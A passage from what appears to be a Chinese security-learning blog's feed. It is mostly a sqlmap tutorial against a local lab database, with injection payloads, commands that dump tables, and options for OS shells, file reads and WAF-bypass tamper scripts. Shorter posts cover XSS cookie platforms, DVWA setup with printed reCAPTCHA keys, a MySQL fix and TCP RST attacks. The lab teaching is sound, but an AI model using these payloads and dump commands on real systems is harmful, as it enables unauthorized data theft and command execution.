src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/BCE51F37-776A-437F-9CE6-9BB5D0A8B1F7.png"></p><p>然后使用 -r 参数来指定HTTP包（ -r REQUESTFILE      Load HTTP request from a file）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt</span><br></pre></td></tr></table></figure><p>这种方式可以检测出GET类型或者POST类型的注入漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 2269&#x3D;2269 AND &#39;fYWA&#39;&#x3D;&#39;fYWA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND GTID_SUBSET(CONCAT(0x716b6a7671,(SELECT (ELT(8383&#x3D;8383,1))),0x7176786a71),8383) AND &#39;THdq&#39;&#x3D;&#39;THdq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 1253 FROM (SELECT(SLEEP(5)))PKdp) AND &#39;yWGz&#39;&#x3D;&#39;yWGz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id&#x3D;-8764&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a7671,0x766e654f656c6f7779676842616d704f53567a74486b645956614a4b527578794d6f44544775644b,0x7176786a71)-- -</span><br></pre></td></tr></table></figure><p>如果仔细看SQLmap给出的提示信息，可以看到他已经将运行结果进行保存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[16:00:42] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: PHP 7.4.6</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.6</span><br><span class="line">[16:00:42] [INFO] fetched data logged to text files under &#39;&#x2F;Users&#x2F;littlechieh6&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;burpsuite.slug01sh.top&#39;（运行结果保存地址）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] ending @ 16:00:42 &#x2F;2021-01-26&#x2F;</span><br></pre></td></tr></table></figure><h1 id="2-获取数据库名"><a href="#2-获取数据库名" class="headerlink" title="2 获取数据库名"></a>2 获取数据库名</h1><p>使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --dbs</span><br></pre></td></tr></table></figure><p>数据库信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">web application technology: PHP 7.4.6</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.6</span><br><span class="line">[16:05:51] [INFO] fetching database names</span><br><span class="line">[16:05:51] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[16:05:51] [INFO] retrieved: &#39;mysql&#39;</span><br><span class="line">[16:05:51] [INFO] retrieved: &#39;information_schema&#39;</span><br><span class="line">[16:05:51] [INFO] retrieved: &#39;performance_schema&#39;</span><br><span class="line">[16:05:51] [INFO] retrieved: &#39;sys&#39;</span><br><span class="line">[16:05:51] [INFO] retrieved: &#39;study&#39;</span><br><span class="line">[16:05:51] [INFO] retrieved: &#39;hello_ssm&#39;</span><br><span class="line">[16:05:51] [INFO] retrieved: &#39;dvwa&#39;</span><br><span class="line">[16:05:51] [INFO] retrieved: &#39;security&#39;</span><br><span class="line">[16:05:51] [INFO] retrieved: &#39;challenges&#39;</span><br><span class="line">available databases [9]:</span><br><span class="line">[*] challenges</span><br><span class="line">[*] dvwa</span><br><span class="line">[*] hello_ssm</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] security</span><br><span class="line">[*] study</span><br><span class="line">[*] sys</span><br></pre></td></tr></table></figure><h1 id="3-获取数据表名"><a href="#3-获取数据表名" class="headerlink" title="3 获取数据表名"></a>3 获取数据表名</h1><p>使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --tables</span><br></pre></td></tr></table></figure><p>这个命令会列出系统中所有的表名，不经常使用。</p><p>常用的获取数据表名的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt -D&#x3D;&quot;security&quot; --tables</span><br></pre></td></tr></table></figure><p>使用-D指定数据库名，获取特定数据库的数据表名。执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[16:09:23] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: PHP 7.4.6</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.6</span><br><span class="line">[16:09:23] [INFO] fetching tables for database: &#39;security&#39;</span><br><span class="line">[16:09:23] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[16:09:23] [INFO] retrieved: &#39;emails&#39;</span><br><span class="line">[16:09:23] [INFO] retrieved: &#39;referers&#39;</span><br><span class="line">[16:09:23] [INFO] retrieved: &#39;uagents&#39;</span><br><span class="line">[16:09:23] [INFO] retrieved: &#39;users&#39;</span><br><span class="line">Database: security</span><br><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br><span class="line"></span><br><span class="line">[16:09:23] [INFO] fetched data logged to text files under &#39;&#x2F;Users&#x2F;littlechieh6&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;burpsuite.slug01sh.top&#39;</span><br><span class="line"></span><br><span class="line">[*] ending @ 16:09:23 &#x2F;2021-01-26&#x2F;</span><br></pre></td></tr></table></figure><h1 id="4-获取字段名"><a href="#4-获取字段名" class="headerlink" title="4 获取字段名"></a>4 获取字段名</h1><p>类似上面获取表名的方法，我们最好指定一个数据表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt -D&#x3D;&quot;security&quot; -T emails --columns</span><br></pre></td></tr></table></figure><p>指定参数除了可以采用 <code>-D=&quot;security&quot;</code> 的方式，还可以采用 <code>-T email</code> 的方式。</p><p>执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[16:13:59] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: PHP 7.4.6</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.6</span><br><span class="line">[16:13:59] [INFO] fetching columns for table &#39;emails&#39; in database &#39;security&#39;</span><br><span class="line">[16:14:00] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[16:14:00] [INFO] retrieved: &#39;id&#39;,&#39;int&#39;</span><br><span class="line">[16:14:00] [INFO] retrieved: &#39;email_id&#39;,&#39;varchar(30)&#39;</span><br><span class="line">Database: security</span><br><span class="line">Table: emails</span><br><span class="line">[2 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| email_id | varchar(30) |</span><br><span class="line">| id       | int         |</span><br><span class="line">+----------+-------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[16:14:00] [INFO] fetched data logged to text files under &#39;&#x2F;Users&#x2F;littlechieh6&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;burpsuite.slug01sh.top&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] ending @ 16:14:00 &#x2F;2021-01-26&#x2F;</span><br></pre></td></tr></table></figure><h1 id="5-获取数据"><a href="#5-获取数据" class="headerlink" title="5 获取数据"></a>5 获取数据</h1><p>使用的命令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt -D &quot;security&quot; -T emails -C email_id,id --dump</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[16:17:19] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: PHP 7.4.6</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.6</span><br><span class="line">[16:17:19] [INFO] fetching entries of column(s) &#39;email_id, id&#39; for table &#39;emails&#39; in database &#39;security&#39;</span><br><span class="line">[16:17:19] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[16:17:19] [INFO] retrieved: &#39;Dumb@dhakkan.com&#39;,&#39;1&#39;</span><br><span class="line">[16:17:19] [INFO] retrieved: &#39;Angel@iloveu.com&#39;,&#39;2&#39;</span><br><span class="line">[16:17:19] [INFO] retrieved: &#39;Dummy@dhakkan.local&#39;,&#39;3&#39;</span><br><span class="line">[16:17:19] [INFO] retrieved: &#39;secure@dhakkan.local&#39;,&#39;4&#39;</span><br><span class="line">[16:17:19] [INFO] retrieved: &#39;stupid@dhakkan.local&#39;,&#39;5&#39;</span><br><span class="line">[16:17:19] [INFO] retrieved: &#39;superman@dhakkan.local&#39;,&#39;6&#39;</span><br><span class="line">[16:17:19] [INFO] retrieved: &#39;batman@dhakkan.local&#39;,&#39;7&#39;</span><br><span class="line">[16:17:19] [INFO] retrieved: &#39;admin@dhakkan.com&#39;,&#39;8&#39;</span><br><span class="line">Database: security</span><br><span class="line">Table: emails</span><br><span class="line">[8 entries]</span><br><span class="line">+------------------------+----+</span><br><span class="line">| email_id               | id |</span><br><span class="line">+------------------------+----+</span><br><span class="line">| Dumb@dhakkan.com       | 1  |</span><br><span class="line">| Angel@iloveu.com       | 2  |</span><br><span class="line">| Dummy@dhakkan.local    | 3  |</span><br><span class="line">| secure@dhakkan.local   | 4  |</span><br><span class="line">| stupid@dhakkan.local   | 5  |</span><br><span class="line">| superman@dhakkan.local | 6  |</span><br><span class="line">| batman@dhakkan.local   | 7  |</span><br><span class="line">| admin@dhakkan.com      | 8  |</span><br><span class="line">+------------------------+----+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[16:17:19] [INFO] table &#39;security.emails&#39; dumped to CSV file &#39;&#x2F;Users&#x2F;littlechieh6&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;burpsuite.slug01sh.top&#x2F;dump&#x2F;security&#x2F;emails.csv&#39;（数据表）</span><br><span class="line">[16:17:19] [INFO] fetched data logged to text files under &#39;&#x2F;Users&#x2F;littlechieh6&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;burpsuite.slug01sh.top&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] ending @ 16:17:19 &#x2F;2021-01-26&#x2F;</span><br></pre></td></tr></table></figure><p>获取到的数据将会保存到csv文件中。</p><h1 id="6-其他参数"><a href="#6-其他参数" class="headerlink" title="6 其他参数"></a>6 其他参数</h1><p>配置</p><ul><li>–level n：其中n为1～5，代表不同的探测等级（等级越高，就会测试越全面，但是也会发送更多的请求。默认为1）</li><li>–referer：设置referer来进行欺骗。</li><li>–sql-shel：运行自定义的SQL语句</li><li>–os-cmd或–os-shell：执行系统命令</li><li>–file-read：读取系统文件</li><li>–file-write或–file-dest：文件写入</li><li>–tamper 模块名：指定绕过WAF/IDS/IPS的脚本</li></ul><p>信息收集</p><ul><li>–users：所有用户</li><li>–passwords：用户的密码</li><li>–curent-db：当前数据库名</li><li>–curent-user：当前的用户名</li><li>–is-dba：当前用户是否为管理员</li><li>–roles：列出管理员</li></ul><h1 id="7-Tamper"><a href="#7-Tamper" class="headerlink" title="7 Tamper"></a>7 Tamper</h1><p>tamper通常用于绕过WAF。用一个简单的base64encode分析一下吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Base64-encodes all characters in a given payload</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&quot;1&#x27; AND SLEEP(5)#&quot;)</span></span><br><span class="line"><span class="string">    &#x27;MScgQU5EIFNMRUVQKDUpIw==&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>tamper主要就是在发送前进行一次转换，比如：有些网站在发送前会进行Base64加密，服务器接收到数据后进行base64解密。如果没有使用tamper，直接使用sqlmap则发送的是明文，在服务器base64解密后肯定无法进行注入。</p><p>通常都需要具体分析网站发送数据的方式来编写tamper脚本。使用方法：<code>--tamper 模块名（文件名）</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 《Web安全攻防》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全攻防之XSS平台搭建</title>
      <link href="1ac52a60b69f/"/>
      <url>1ac52a60b69f/</url>
      
        <content type="html"><![CDATA[<ul><li>XSS测试平台：主要用与接收测试XSS得到的cookie，或者托管 exp（在打CTF时可能会需要使用这种平台。</li><li>XSS game：有XSS漏洞的游戏，用来训练XSS技术。</li></ul><p>不推荐自己搭建，建议使用 <a href="https://xs.sb/">https://xs.sb/</a> 平台。自己在本地搭建了只能收到自己的Cookie，作用不大。</p><p>如果自己搭建则需要准备：</p><ul><li>一个可用域名（越短越好）；</li><li>如果你需要测试HTTPS网站，请准备SSL证书（可从Cloudflare或Let’s Encrypt获取免费的SSL证书）；</li></ul><p>即麻烦还难以维护（我就是懒，逃</p>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《Web安全攻防》 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全攻防之搭建DVWA漏洞环境</title>
      <link href="afef5eced7c4/"/>
      <url>afef5eced7c4/</url>
      
        <content type="html"><![CDATA[<p>DVWA（Damn Vulnerable Web Application）漏洞环境是开源的漏洞测试平台，其中包含SQL注入、XSS、文件上传、文件包含、CSRF等基本的漏洞环境。</p><h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1 准备工作"></a>1 准备工作</h1><p>搭建环境需要的其他环境</p><ul><li>VScode（配置运行PHP的插件）</li><li>PHP运行环境</li><li>MySQL运行环境</li></ul><h1 id="2-搭建漏洞环境"><a href="#2-搭建漏洞环境" class="headerlink" title="2 搭建漏洞环境"></a>2 搭建漏洞环境</h1><p>并没有在kali中搭建环境，而是在自己的物理机上，在虚拟机中搭建每次都要打开虚拟机，太烦了吧。</p><p>在MySQL中新建一个数据库（建议使用Navicat）</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/6A5B22BA-73EC-48A4-9DFF-9DA3F5CDDA25.png"></p><p>使用VScode打开dvwa的文件夹，进入 config 文件夹编辑 config.inc.php.dist 文件，并且将 config.inc.php.dist 改名为 config.inc.php。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/ED7A36C2-C45D-4D0A-BFF7-E715C0E03525.png"></p><p>使用VScode插件运行当前项目，成功运行后打开路径：<a href="http://localhost:4000/setup.php">http://localhost:4000/setup.php</a> 并且点击 Create/Reset database 即可。登陆的默认账号为 <code>admin</code>，密码为 <code>password</code>。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/CA570EBF-E3FB-46AA-A68C-374FBC3FFB4C.png"></p><p>检查一下 Navicat 即可发现已经创建新的数据表。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D773E033-D5C2-4A0B-B1D4-97E227C6BDC8.png"></p><h1 id="3-配置"><a href="#3-配置" class="headerlink" title="3 配置"></a>3 配置</h1><p>我们可以回到前面的 <a href="http://localhost:4000/setup.php">http://localhost:4000/setup.php</a> 查看有哪些地方还没有配置完善。</p><p>如下图所示<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B3A5A83E-D60D-4D93-B2E0-5C8E456FD471.png"></p><p>上图中有两处配置是红色：</p><ol><li>allow_url_include 红色</li><li>reCAPTCHA key 红色</li></ol><p>配置的下方有配置的方法。</p><h2 id="3-1-配置allow-url-include"><a href="#3-1-配置allow-url-include" class="headerlink" title="3.1 配置allow_url_include"></a>3.1 配置allow_url_include</h2><p>allow_url_include 没有开启，修改 php.ini，参考最下面的提示进行修改。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; Whether to allow the treatment of URLs (like http:// or ftp://) as files.</span></span><br><span class="line"><span class="comment">; http://php.net/allow-url-fopen</span></span><br><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; Whether to allow include/require to open URLs (like http:// or ftp://) as files.</span></span><br><span class="line"><span class="comment">; http://php.net/allow-url-include</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span></span><br></pre></td></tr></table></figure><h2 id="3-2-reCAPTCHA"><a href="#3-2-reCAPTCHA" class="headerlink" title="3.2 reCAPTCHA"></a>3.2 reCAPTCHA</h2><p>key 可以自己生成，地址是 <a href="https://www.google.com/recaptcha/admin/create">https://www.google.com/recaptcha/admin/create</a> ，需要注意注册 reCAPTCHA 时选用 V3版，在DVWA中会提示错误，使用 V2 版正常。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C305329E-4C8F-414A-9F3C-2B03AA7206B3.png"></p><p>标签按照自己的喜好设置，reCAPTCHA类型设置为第二版的第一个。保存之后即可得到公钥和私钥。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1EA13BE6-BE48-4C94-96FE-D4989E66E8E1.png"></p><p>编辑 dvwa/config/config.inc.php这个配置文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ <span class="string">&#x27;recaptcha_public_key&#x27;</span> ] = <span class="string">&#x27;6LeaSDsaAAAAADdDGBCByaqcBLrWa6oKr-aKqBg4&#x27;</span>;</span><br><span class="line">$_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ] = <span class="string">&#x27;6LeaSDsaAAAAAIkRd3FVpb1bE5YkIgbmOis297fe&#x27;</span>;</span><br></pre></td></tr></table></figure><h1 id="4-效果图"><a href="#4-效果图" class="headerlink" title="4 效果图"></a>4 效果图</h1><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C0466D62-AC9F-41E0-8DCA-6CFBF2E804C3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《Web安全攻防》 </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决MySQL启动问题</title>
      <link href="24b09f4a0cd3/"/>
      <url>24b09f4a0cd3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-报错信息"><a href="#1-报错信息" class="headerlink" title="1 报错信息"></a>1 报错信息</h1><p>今天在启动MySQL时，发现启动失败。MxSrvs的报错信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL Start Failure,Please check the related logs</span><br><span class="line">MySQL Start Failure,Please check the related logs</span><br></pre></td></tr></table></figure><h1 id="2-查看日志"><a href="#2-查看日志" class="headerlink" title="2 查看日志"></a>2 查看日志</h1><p>定位到今天的ERROR日志<br><img src="https://img-blog.csdnimg.cn/20210114104933306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDg1NjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>具体的错误信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2021-01-14T10:05:04.821628+08:00 0 [ERROR] [MY-010259] [Server] Another process with pid 1033 is using unix socket file.</span><br><span class="line">2021-01-14T10:05:04.822136+08:00 0 [ERROR] [MY-010268] [Server] Unable to setup unix socket lock file.</span><br><span class="line">2021-01-14T10:05:04.823013+08:00 0 [ERROR] [MY-010119] [Server] Aborting</span><br></pre></td></tr></table></figure><p><code>mysql.lock</code>文件的作用：mysql的主机和客户机在同一host（物理服务器）上的时候，使用unix domain socket做为通讯协议的载体，它比tcp快。</p><h1 id="3-解决办法"><a href="#3-解决办法" class="headerlink" title="3 解决办法"></a>3 解决办法</h1><ul><li><p>在日志文件中找到 <code>mysql.lock</code>文件。<br><img src="https://img-blog.csdnimg.cn/20210114105437875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDg1NjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（如果害怕出问题，可以先备份一下再删除）</p></li><li><p>删除sock文件（下面的两个文件都删掉）<br><img src="https://img-blog.csdnimg.cn/20210114105559615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDg1NjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>重启服务即可</p></li></ul><p>参考文章：</p><ol><li><a href="https://zhuanlan.zhihu.com/p/38949932">https://zhuanlan.zhihu.com/p/38949932</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RST攻击扫盲</title>
      <link href="d678a06bc8c8/"/>
      <url>d678a06bc8c8/</url>
      
        <content type="html"><![CDATA[<p>RST 攻击也叫 TCP 重置攻击。TCP 重置攻击是指黑客伪造 TCP 的 RST 包来断开用户与网站的连接，这个技术也被运用在防火墙中，例如著名的 GFW。</p><p><strong>什么是RST？</strong></p><p>RST 是 Reset 的简称。在我看来，RST 有点类似于手机的强制重启。当我们手机死机时，我们通常会长按电源键来将手机直接关机，这时手机不会保存任何内容。RST 也类似与这样，当 A 和 B 正在通信时，B 收到 A 发送的 RST 时，A 和 B 会直接进行中断，而不会采用四次分手的方式发送 FIN 信号。</p><p><strong>什么是RST攻击？</strong></p><p>通过第三方的 C 伪造 TCP 的包，让 B 误以为 A 发送了 RST 包，从而使得 A 和 B 之间的连接断开。</p><p><strong>预防方式</strong></p><p>通过 VPN 加密，让攻击者无法准确判断「被攻击者」，此时攻击者只能盲目的攻击所有的加密链接，增大攻击的难度。</p><p>参考文章</p><ol><li>TCP协议：<a href="https://www.ruanyifeng.com/blog/2017/06/tcp-protocol.html">https://www.ruanyifeng.com/blog/2017/06/tcp-protocol.html</a></li><li>详解RST、RST攻击：<a href="https://blog.csdn.net/weixin_36750623/article/details/84953067">https://blog.csdn.net/weixin_36750623/article/details/84953067</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> tcp重置攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全攻防之信息搜集</title>
      <link href="522ce06c11f8/"/>
      <url>522ce06c11f8/</url>
      
